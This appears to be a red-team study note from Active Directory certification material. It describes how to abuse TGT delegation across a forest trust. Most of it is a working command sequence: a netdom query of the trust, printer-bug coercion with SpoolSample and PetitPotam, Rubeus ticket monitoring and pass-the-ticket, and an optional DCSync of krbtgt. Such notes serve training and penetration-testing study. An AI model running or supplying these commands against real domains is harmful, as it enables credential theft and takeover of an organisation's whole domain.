# Methodology
>1. Check if TGTDelegation is enabled accross forest trust.
>2. Abuse printer bug or check for high value target tickets in memory.
>3. Capture the TGT of the high value target.
>4. Copy the ticket (remove extra spaces).
>5. Pass the ticket
>6. (OPTIONAL) Dcsync krbtgt.
---

**Check if TGTDelegation is enabled:**
```cmd
netdom trust contoso.local /domain:eu.local /query /EnableTgtDelegation
```

- **If output says `YES`**:
	- `eu.local` is vulnerable to TGT delegation attacks.

- **If output says `NO`**:
	- The trust does **not** allow TGT delegation.

# Binaries
>**ℹ️ Info:**
>
> Remember to follow the [binaries methodology](Notes/Certifications/CRTE/00%20-%20Miscellaneous/01-%20Methodology.md#Binaries).

## Rubeus

**Monitor the target for the TGT:**
```cmd
Rubeus.exe monitor /targetuser:target$ /interval:5 /nowrap
```

**Abuse printer bug:**
https://github.com/leechristensen/SpoolSample
https://github.com/topotam/PetitPotam
```cmd
# With SpoolSample
MS-RPRN.exe \\target.contoso.local \\unconstrained.contoso.local

# With PetitPotam
PetitPotam.exe target unconstrained
```

**Pass the ticket:**
```cmd
Rubeus.exe ptt /ticket:doIFsjCCBa6gAwIBBaEDAgEWooI...
```



netdom trust contoso.local /domain:eu.local /query /EnableTgtDelegation